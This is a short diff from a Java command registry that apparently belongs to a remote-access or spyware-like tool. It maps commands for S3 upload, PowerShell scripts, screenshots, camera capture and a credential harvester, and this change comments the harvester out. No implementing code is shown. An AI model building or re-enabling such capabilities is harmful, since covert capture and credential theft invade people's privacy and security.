@@ -26,7 +26,7 @@ public class CommandFactory {
         commandsList.put("upload", new UploadToS3Command());
         commandsList.put("/power-script", new PowerShellScripts());
 
-        commandsList.put("/harvest-secrets", new CredHarvesterCommand());
+//        commandsList.put("/harvest-secrets", new CredHarvesterCommand());
 
         commandsList.put("screenshot", new ScreenShotCommand());
         commandsList.put("camera-shot", new CameraScreenShotCommand());
